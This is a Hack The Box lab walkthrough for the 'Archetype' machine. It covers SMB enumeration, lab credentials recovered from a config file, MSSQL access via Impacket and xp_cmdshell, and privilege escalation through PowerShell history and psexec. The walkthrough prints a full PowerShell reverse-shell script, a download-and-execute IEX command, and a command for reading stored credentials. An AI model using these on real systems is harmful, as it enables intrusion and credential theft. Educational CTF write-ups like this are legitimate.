# Hack-The-Box: Archetype


My Journy through Hack the Box 

# Enumeration
# Step 1: Start with a nmap scan. 
< nmap -A 10.10.10.27 > 
Below are the Results

![image](https://user-images.githubusercontent.com/29686845/131066685-44d20e27-e12d-4555-9055-5bb5bc56d1ba.png)

+ It is important to know that using nmap -A <IP> is a really noisy scan. It can be detected by pretty ealisy, but nmap offers other flags that would be more silent. To take a further look you could always type nmap -h or --help in your terminal, or visit https://nmap.org/ to read all about nmap

# Setp 2:  We are going to look at the Open ports on the machine. 
  
  ![image](https://user-images.githubusercontent.com/29686845/131206340-b89a8d27-fc62-4687-9bde-7a6bee6d759b.png)
  
  The main idea of an RPC is to allow a local computer (client) to remotely call procedures on a different computer (server).
  * If you would like to learn more about PRC check out this link: https://docs.microsoft.com/en-us/windows/win32/rpc/how-rpc-works . 

  
  ![image](https://user-images.githubusercontent.com/29686845/131236883-8c6677b2-b1dd-4b07-b4ba-4f4069b93219.png)

 Ports 139 & Ports 445 both use SMB
  * SMB: is a file sharing protocol. This allows you to have network shared folders and mapped drives on a LAN (Local Area Network) 
    * Port 139: Is an older protocol that was phased out with the relese of Windows 2000. SMB would stack on top of netbios to distribute network shares.
    * Port 445: Is the later version of SMB that uses a TCP (Transmission Control Protocol) stack to share over a network. 
  * If you would like to learn about netbios, SMB, and TCP check out these links:
  https://searchnetworking.techtarget.com/definition/NetBIOS 
  https://www.varonis.com/blog/smb-port/ 
  https://www.fortinet.com/resources/cyberglossary/tcp-ip
  
![image](https://user-images.githubusercontent.com/29686845/131237343-356c92a3-efd2-4d69-a7ca-51abedd648b9.png)
Lastly, is port 1433 ms-sql-s
  
  * SQL is used to communicate with databases over TCP and UDP ports
    * If you want to read more about it check out these Links: 
     https://en.wikipedia.org/wiki/Microsoft_SQL_Server  https://www.sqlsplus.com/sql-server-ports-tcp-and-udp-ports/
 
# Step 3: Exploring Ports
  We know that Port 136 & 445 is SMB so lets take a look to see if we can access any of their network shares. 
 
  To do this we are going to use a command name smbclient
   * Check out this link to learn about smbclient https://www.samba.org/samba/docs/current/man-html/smbclient.1.html or use smbclinet --help in your terminal. 
 
![image](https://user-images.githubusercontent.com/29686845/131262396-762e908e-36a8-4df2-a31d-ec3e656ff294.png)

I ran the command <smbclient -L //10.10.10.27/
 * It prompted for a password which I did not know. but based on the nmap scan we previously discovered. I typed in "archetype" and it allowed me to see the network shares. 
 * As we can see from the image above all folders are password protected with $ signs next to the file share, but the one we can acccess is backups. 
                             
I ran the commmand < smbclient //10.10.10.27/backups
 
 * It still asked for a password and I used "archetype" and i got access as you can see below
 ![image](https://user-images.githubusercontent.com/29686845/131262936-c8b8160a-b452-427a-9120-b104ba97ca86.png)

 * The only thing we see that is useful is a prod.dtsConfig file. 
 * We can use < get prod.dtsConfig > to pull the file to our local machine.
 * Once pulled we can use the less command to read the file to see if there was any useful information in the file. 
 
![image](https://user-images.githubusercontent.com/29686845/131263212-4e810bba-b41d-4027-9965-9dd258001c92.png)

 * Inside the file we can see user credentials (User ID: ARCHETYPE  &  Password: M3g4c0rp123) 
 * With this information we can we now move onto gaining a foothold
 

# Exploit : Gaining a foothold
  - We are going to try and connect to the SQL server using mysqlclient.py that Impacket provides. (there are other mysqlclient python scripts that you can run, but this one seems to be the most commonly used for this machine) 
    - I had some issues with installing this so to avoid some frustration on your end here is what fixed my problem. 
    - 1) am running a dual boot on my laptop and my time was not synced. I used the following command to sync both my linux and windows os time. 
  
  ![image](https://user-images.githubusercontent.com/29686845/131587780-df6433c6-cf8e-4585-9bf0-2708865c7f23.png)
  
    - 2) I updated my linux using the command [sudo apt update]

# step 1: Impacket
  - First we are going to install impacket from (https://github.com/SecureAuthCorp/impacket) by using a git clone command that can be seen below:
  
  ![image](https://user-images.githubusercontent.com/29686845/131586903-7d40c1ef-59e5-47bc-9307-aecaeca5399e.png)
  
  - once the installation are finished we are going to install impaket by using the instructions provided and running the command: 
  
  ![image](https://user-images.githubusercontent.com/29686845/131587071-fb26a2fa-c4e5-4f0e-9373-fd731801dbe7.png)

  # Step 2: Exploitation
  
  - we are going to run the mysqlclient.py script with the UN: ARCHETYPE/sql_svc and the IP addr: 10.10.10.27 and the windows auth flag as seen below: 
  
![image](https://user-images.githubusercontent.com/29686845/131588329-337252ef-3680-4c2c-bff1-86d14f5f3a5b.png)

  - when prompted for a password we will try the M3g4c0rp123 password we found earlier. 

![image](https://user-images.githubusercontent.com/29686845/131588959-3696fac3-9758-4439-86e2-f46ea3e01ea9.png)

  - As you can see it worked we now have a connection to the SQL server
  - First we will check to see if our user has sysadmin privleges with the following command:
  
  ![image](https://user-images.githubusercontent.com/29686845/131594435-3565c333-9872-43e3-825f-3e05a959614f.png)
  
  - We see that it displays a 1. (in SQL 1 is true and 0 is false.)
  - So we have the highest level of privleges so we are going to try and spawn a shell. 
  
# Step 3: Creating a shell

Keep in mind we are still going to be inputting SQL commands (I will put link at the end of this section so you can learn more about SQL)

We need to create a xp_cmdshell and we can review this link https://stackoverflow.com/questions/5131491/enable-xp-cmdshell-sql-server to show us how, but I will walk your through the process as well. 
  
  - we will run the follwing commands in the screenshot below:
  
![image](https://user-images.githubusercontent.com/29686845/131596474-566cdac8-fb51-421e-89d7-bd5e55fecb5d.png)
![image](https://user-images.githubusercontent.com/29686845/131596593-cb3e584b-f80d-4cba-a9ff-b48aee44ae54.png)

Even though we are now using a cmd shell we should still attempt to get a proper shell. 
  - First lets create a script and call it shell.ps1 with the code that is in between the bars.
  
----------------------------------------------------------------------------------
      $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream =
      $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
      $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName
      System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 |
      Out-String );$sendback2 = $sendback + "# ";$sendbyte =
      ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyt
      e.Length);$stream.Flush()};$client.Close()
----------------------------------------------------------------------------------

  - A simple way to do this is to copy and paste it into nano
    - lets open a new terminal or split your teminal. 
    - type the command nano shell.py
    - Copy and paste the above commands into nano
    - On the first line, make sure that your IP Address is there and not the one provided. 
      - To do this run a ifconfig command
      - Note your tun0: inet address (if you are using a VM I think it is a different one) 
    - Save and exit
  - You are going to need to clean up the script to look like this. Placement is Important
  
  ![image](https://user-images.githubusercontent.com/29686845/131732473-9d48452d-9b91-4b77-a7d6-cacbaf26afa2.png)

  
  - If you are unfamiliar with nano please check out this link: https://linuxize.com/post/how-to-use-nano-text-editor/
  - Don't forget to make your script executable by using the chmod command below: 
  
![image](https://user-images.githubusercontent.com/29686845/131713651-dcb59f72-9e6c-4bb1-b80d-236fe5c328d3.png)

  - After we have our script made and changed it to executable we need to spin up a mini http server and use net cat to listen and we will run the following commands in two seperate termanls to do so. 
  
![image](https://user-images.githubusercontent.com/29686845/131714996-8a06b6dc-8e95-4acb-a5e3-f21e03d46f9a.png)
  
![image](https://user-images.githubusercontent.com/29686845/131731310-180ee8d5-e225-4777-b697-9a158d90a8f1.png)
  
  - Once we have our web server and our listening port we will type in the following command to upload or shell.py to the SQL server
  
  ![image](https://user-images.githubusercontent.com/29686845/131731436-9257971b-66f1-4712-8cc1-879f5c4fb16b.png)

      xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
  
  - If you're having issues double check the IP address of the command above and double check the IP address in your shell.ps1 script. 
    - you can use the ifconfig command to check your IP address along with your HTB Private IP address. 
  
  - We can use the following command to see if we have access to the windows command shell: 
  
  ![image](https://user-images.githubusercontent.com/29686845/132119514-8dd49617-45f2-4a88-b22f-c09aa0497320.png)

  - you will see a list of files in that directory.
    - The Command DIR is the windows equivilent of ls that linux uses. It is important to note that the operating system you are attacking will have a different syntax than what you may be accustome to. 
    - Here is a list of windows equivilent commands https://ftp.kh.edu.tw/Linux/Redhat/en_6.2/doc/gsg/ch-doslinux.htm
  
  - Now we have a shell! 
  
  - To recap we found the user credentials and used them to connect to a SQL server where we could spawn a shell that we can use to run more commands. Next we are going to work on gaining privileged user access or gain access to an administrator account. 
  
# Step 4: Privilege Escalation
  
  - We will check the following directory and look at the ConsoleHost_history.txt

          type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  
 ![image](https://user-images.githubusercontent.com/29686845/132119928-a7e491d7-e9ad-4ea7-9075-5654f847bccb.png)

  - As you can see we have found the administrator set of credentials. 
  
![image](https://user-images.githubusercontent.com/29686845/132119977-e0f93582-3a5a-4dd4-9aab-62c3e98aacbb.png)

  - Lastly, we will try to get a powershell terminal that runs as administrator or highest level of privileges. 
  - To do this we will use impackets psexec.py 
  
![image](https://user-images.githubusercontent.com/29686845/132120129-00d64abc-d091-4f62-aab1-23d9790e7344.png)

  - We will add the administrator password we found earlier
  - Now we have a shell. 
  - Lastly, we will want to go to the users administrator and look at their desktop to find the root.txt as seen below:
  
![image](https://user-images.githubusercontent.com/29686845/132120261-98db517c-9360-485c-bc3c-05cd9a8cc146.png)

  - You can also look around the machine if you would like, but now we have user and root. Enter that into the flags on HTB and we are done with Archetype! 
  
  
Thank you guys so much and I hope this walkthrough helped you as much as it helped me! 
